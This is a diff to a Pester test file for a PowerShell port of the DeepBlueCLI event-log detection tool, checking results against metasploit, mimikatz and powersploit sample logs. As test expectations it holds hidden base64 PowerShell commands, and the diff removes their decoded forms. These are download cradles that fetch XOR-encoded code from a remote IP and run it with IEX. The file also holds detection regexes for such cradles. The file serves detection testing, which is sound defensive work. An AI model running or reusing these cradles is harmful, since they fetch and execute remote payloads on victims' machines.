@@ -167,6 +167,8 @@ Describe 'Testing Sample EVTX files' {
         BeforeAll {
             $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
             $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'metasploit-psexec-powershell-target-security.evtx')).FullName)
+            # $r contains malicious content detected as Trojan:PowerShell/Injector
+            # https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:PowerShell/Injector&threatid=2147725647&enterprise=0
             $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Command','Decoded') } | Select-Object -Expand Name
             $ar = @(
                 [PSCustomObject]@{
@@ -225,11 +227,12 @@ Describe 'Testing Sample EVTX files' {
             $i++
         }
     }
-    # metasploit-psexec-powershell-target-system.evtx
     Context 'metasploit-psexec-powershell-target-system' {
         BeforeAll {
             $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
             $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'metasploit-psexec-powershell-target-system.evtx')).FullName)
+            # $r contains malicious content detected as TrojanDownloader:PowerShell/Plasti.A
+            # https://go.microsoft.com/fwlink/?linkid=37020&name=TrojanDownloader:PowerShell/Plasti.A&threatid=2147720558&enterprise=0
             $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Command','Decoded') } | Select-Object -Expand Name
             $ar = @(
                 [PSCustomObject]@{
@@ -307,7 +310,6 @@ Describe 'Testing Sample EVTX files' {
     # metasploit-psexec-pwshpayload.evtx
     # the original DeepBlue doesn't detect anything
     # 1102 Information      The audit log was cleared
-    # mimikatz-privesc-hashdump.evtx
     Context 'mimikatz-privesc-hashdump' {
         BeforeAll {
             $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
@@ -339,7 +341,6 @@ Describe 'Testing Sample EVTX files' {
     # mimikatz-privilegedebug-tokenelevate-hashdump.evtx
     # the original DeepBlue doesn't detect anything
     # 1102 Information      The audit log was cleared
-    # new-user-security.evtx
     Context 'new-user-security' {
         BeforeAll {
             $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
@@ -375,7 +376,6 @@ Describe 'Testing Sample EVTX files' {
             $i++
         }
     }
-    # password-spray.evtx
     # Context 'password-spray' {
     #     BeforeAll {
     #         $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
@@ -422,7 +422,6 @@ Describe 'Testing Sample EVTX files' {
             $i++
         }
     }
-    # Powershell-Invoke-Obfuscation-many.evtx
     Context 'Powershell-Invoke-Obfuscation-many' {
         BeforeAll {
             $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
@@ -454,7 +453,6 @@ Describe 'Testing Sample EVTX files' {
             $i++
         }
     }
-    # Powershell-Invoke-Obfuscation-string-menu.evtx
     Context 'Powershell-Invoke-Obfuscation-string-menu' {
         BeforeAll {
             $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
@@ -516,12 +514,19 @@ $l7i= " ))93]RaHc[ f-  )'sderCpmuD-'+' ztak'+'imi'+'M'+'-e'+'kovnI'+' '+';)}0{'+
             $i++
         }
     }
-    # powersploit-security.evtx
     Context 'powersploit-security' {
         BeforeAll {
             $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
             $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'powersploit-security.evtx')).FullName)
-            # $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Decoded') } | Select-Object -Expand Name
+            # $r contains malicious content detected as TrojanDownloader:PowerShell/Agent.ABM!MTB
+            # https://go.microsoft.com/fwlink/?linkid=37020&name=TrojanDownloader:PowerShell/Agent.ABM!MTB&threatid=2147744050&enterprise=0
+            # Skip 'Decoded' property because
+            <#
+            This script contains malicious content and has been blocked by your antivirus software.
+            at Invoke-Blocks, C:\Program Files\WindowsPowerShell\Modules\Pester\4.10.1\Functions\SetupTeardown.ps1: line 135
+            at Invoke-TestGroupSetupBlocks, C:\Program Files\WindowsPowerShell\Modules\Pester\4.10.1\Functions\SetupTeardown.ps1: line 121
+            #>
+            $props = $r[0].PSObject.Properties | Where-Object { $_.Name -notin @('Decoded') } | Select-Object -Expand Name
             $ar =@(
                 [PSCustomObject]@{
                     Date=[datetime]636100031669033203 # 2016-09-20 21:19:26Z
@@ -532,9 +537,6 @@ $l7i= " ))93]RaHc[ f-  )'sderCpmuD-'+' ztak'+'imi'+'M'+'-e'+'kovnI'+' '+';)}0{'+
                     Command=@'
 powershell.exe  -NoP -sta -NonI -W Hidden -Enc JABXAGMAPQBOAGUAdwAtAE8AQgBKAEUAQwBUACAAUwB5AFMAdABFAG0ALgBOAEUAVAAuAFcAZQBCAEMAbABJAGUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABlAGEAZABFAHIAUwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AWABZACAAPQAgAFsAUwBZAFMAVABFAG0ALgBOAGUAdAAuAFcAZQBiAFIARQBxAHUAZQBzAHQAXQA6ADoARABFAGYAQQB1AGwAdABXAGUAYgBQAFIATwBYAHkAOwAkAHcAQwAuAFAAcgBvAFgAeQAuAEMAcgBlAGQARQBOAFQASQBBAEwAUwAgAD0AIABbAFMAWQBzAFQAZQBNAC4ATgBlAFQALgBDAFIAZQBEAGUAbgB0AGkAQQBMAEMAQQBjAGgAZQBdADoAOgBEAGUARgBBAFUAbAB0AE4AZQB0AHcAbwByAEsAQwBSAEUAZABlAG4AVABJAGEAbABTADsAJABLAD0AJwApADAAZABoAEMAeQAxAEoAOQBzADMAcQBZAEAAJQBMACEANwBwAHUAXQBUAHwAdgBWAH0AdABuAFsAQQBRAFIAJwA7ACQAaQA9ADAAOwBbAEMASABBAHIAWwBdAF0AJABCAD0AKABbAGMASABhAHIAWwBdAF0AKAAkAFcAYwAuAEQAbwB3AG4ATABvAGEARABTAHQAUgBpAG4ARwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQA5ADgALgAxADQAOQA6ADgAMAA4ADIALwBpAG4AZABlAHgALgBhAHMAcAAiACkAKQApAHwAJQB7ACQAXwAtAGIAWABPAHIAJABLAFsAJABJACsAKwAlACQASwAuAEwARQBuAEcAdABoAF0AfQA7AEkARQBYACAAKAAkAEIALQBqAG8AaQBOACcAJwApAA==
 '@
-                    Decoded=@'
-$Wc=New-OBJECT SyStEm.NET.WeBClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadErS.AdD('User-Agent',$u);$wc.ProXY = [SYSTEm.Net.WebREquest]::DEfAultWebPROXy;$wC.ProXy.CredENTIALS = [SYsTeM.NeT.CReDentiALCAche]::DeFAUltNetworKCREdenTIalS;$K=')0dhCy1J9s3qY@%L!7pu]T|vV}tn[AQR';$i=0;[CHAr[]]$B=([cHar[]]($Wc.DownLoaDStRinG("http://192.168.198.149:8082/index.asp")))|%{$_-bXOr$K[$I++%$K.LEnGth]};IEX ($B-joiN'')
-'@
                 },
                 [PSCustomObject]@{
                     Date=[datetime]636100029541289062 # 2016-09-20 21:15:54Z
@@ -544,9 +546,6 @@ $Wc=New-OBJECT SyStEm.NET.WeBClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trid
                     Results="Long Command Line: greater than 1000 bytes`n500+ consecutive Base64 characters`nBase64 encoded and hidden PowerShell command`nBase64-encoded function`nDownload via Net.WebClient DownloadString`nUser-Agent set via command line`n"
                     Command=@'
 powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AUwBFAHIAdgBJAEMAZQBQAG8AaQBOAFQATQBBAE4AYQBHAEUAcgBdADoAOgBFAFgAUABlAEMAVAAxADAAMABDAG8AbgBUAGkAbgB1AEUAIAA9ACAAMAA7ACQAVwBjAD0ATgBlAHcALQBPAGIASgBlAGMAVAAgAFMAWQBTAHQAZQBNAC4ATgBFAFQALgBXAGUAQgBDAGwAaQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgARQBBAEQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAAcgBPAHgAeQAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBXAEUAQgBSAGUAcQB1AEUAUwB0AF0AOgA6AEQAZQBmAGEAdQBMAFQAVwBlAEIAUABSAG8AeAB5ADsAJABXAGMALgBQAFIATwB4AFkALgBDAFIARQBEAGUATgBUAEkAYQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUAbQAuAE4AZQB0AC4AQwByAGUARABlAG4AdABJAEEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQBVAEwAVABOAGUAVAB3AG8AcgBrAEMAcgBFAEQAZQBuAFQASQBhAEwAcwA7ACQASwA9ACcAcwB5AHwAUgA0AFgAaABCAFcAbwB6AEsALgB4AC0ANgArADkAPgBJAGkAcQA3AEQAOABgAEoATABuAGwAdwBWACcAOwAkAEkAPQAwADsAWwBDAEgAYQBSAFsAXQBdACQAQgA9ACgAWwBDAGgAQQBSAFsAXQBdACgAJAB3AGMALgBEAE8AdwBuAGwAbwBhAEQAUwBUAHIASQBOAEcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQA4AC4AMQA0ADkAOgA4ADAAOAAwAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgATwBSACQAawBbACQAaQArACsAJQAkAGsALgBMAGUAbgBnAHQAaABdAH0AOwBJAEUAWAAgACgAJABCAC0ASgBPAEkATgAnACcAKQA=
-'@
-                    Decoded=@'
-[SYStEm.NET.SErvICePoiNTMANaGEr]::EXPeCT100ConTinuE = 0;$Wc=New-ObJecT SYSteM.NET.WeBCliENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEADeRs.AdD('User-Agent',$u);$WC.PrOxy = [SysTem.NeT.WEBRequESt]::DefauLTWeBPRoxy;$Wc.PROxY.CREDeNTIaLs = [SYsTEm.Net.CreDentIAlCache]::DefaULTNeTworkCrEDenTIaLs;$K='sy|R4XhBWozK.x-6+9>Iiq7D8`JLnlwV';$I=0;[CHaR[]]$B=([ChAR[]]($wc.DOwnloaDSTrING("http://192.168.198.149:8080/index.asp")))|%{$_-BXOR$k[$i++%$k.Length]};IEX ($B-JOIN'')
 '@
                 }
             )
@@ -563,13 +562,42 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
             }
             $i++
         }
+        $i = 0
+        $r | ForEach-Object {
+            $o = $_
+            It "Test result $($i) Command" {
+                $o.Command -match 'powershell\.exe'| Should -Be $true
+            }
+            It "Test result $($i) Decoded" {
+                $o.Decoded -match 'New-Object'| Should -Be $true
+            }
+            It "Test result $($i) Decoded" {
+                $o.Decoded -match 'SyStEm\.NET\.WeBClIeNt'| Should -Be $true
+            }
+            It "Test result $($i) Decoded" {
+                $o.Decoded -match 'https?://'| Should -Be $true
+            }
+            It "Test result $($i) Decoded" {
+                $o.Decoded -match 'iex'| Should -Be $true
+            }
+            It "Test result $($i) Decoded" {
+                $o.Decoded -match '\[[cC][hH][aA][rR]\['| Should -Be $true
+            }
+            It "Test result $($i) Decoded" {
+                $o.Decoded -match '\.DOwnloaDSTrING\('| Should -Be $true
+            }
+            It "Test result $($i) Decoded" {
+                $o.Decoded -match '-[bB]?[x|X][oO][rR]'| Should -Be $true
+            }
+        }
     }
-    # powersploit-system.evtx
     Context 'powersploit-system' {
         BeforeAll {
             $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
             $r = @(Get-DeepBlueAnalysis -File (Get-Item -Path (Join-Path -Path $EVTXSamples -ChildPath 'powersploit-system.evtx')).FullName)
-            # skip 'Command' property because
+            # The content of $r can be dumped to a file and it's not detected by AV
+            # But if the content of $r is stored in this Pester file, there's the following error message
+            # Skip 'Command' property because
             <#
             This script contains malicious content and has been blocked by your antivirus software.
             at Invoke-Blocks, C:\Program Files\WindowsPowerShell\Modules\Pester\4.10.1\Functions\SetupTeardown.ps1: line 135
@@ -620,7 +648,6 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
             }
         }
     }
-    # psattack-security.evtx
     Context 'psattack-security' {
         BeforeAll {
             $EVTXSamples = Get-Item -Path '~\Downloads\DeepBlueCLI-master\DeepBlueCLI-master\evtx'
@@ -716,6 +743,5 @@ powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFkAUwB0AEUAbQAuAE4ARQBUAC4AU
     # }
 }
 #endregion
-
 
 } #endof inmodulescope
